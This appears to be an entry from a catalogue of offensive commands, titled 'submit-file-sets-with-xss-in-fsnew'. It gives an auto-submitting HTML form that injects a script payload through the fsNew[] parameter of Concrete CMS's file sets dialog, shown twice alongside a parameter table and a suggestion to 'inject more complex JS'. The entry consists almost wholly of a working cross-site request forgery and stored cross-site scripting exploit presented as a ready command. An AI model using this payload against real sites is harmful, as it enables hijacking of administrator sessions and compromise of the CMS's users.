---
data: >-
  <html>

  <body>

  <form method="POST"
  action="http://localhost/concrete5/index.php/ccm/system/dialogs/file/sets/submit?fID=1">

  <input type="hidden" name="fsNew[]" value="<script>alert(/XSS/)</script>">

  </form>

  <script>document.forms[0].submit()</script>

  </body>

  </html>
tags:
  - xss
  - exploit
type: command
output: null
executor: browser
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:41.385Z'
id: a30e31ad-19f8-4783-b7a9-e468fcee6d4c
verified: false
validated: true
submitted: true
---
# submit-file-sets-with-xss-in-fsnew

## Command

```html
<html>
<body>
<form method="POST" action="http://localhost/concrete5/index.php/ccm/system/dialogs/file/sets/submit?fID=1">
<input type="hidden" name="fsNew[]" value="<script>alert(/XSS/)</script>">
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
```

## Description

Submits file sets dialog with direct script injection in fsNew[] for Concrete CMS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| fsNew[] | Array with script payload | Yes |
| fID | File ID for dialog | Yes |

## Examples

### Basic Usage

Open in browser from file context.

### Advanced Usage

Inject more complex JS.

## Expected Output

Set created; alert on search set action.

## Related

- [[Related Procedure]]
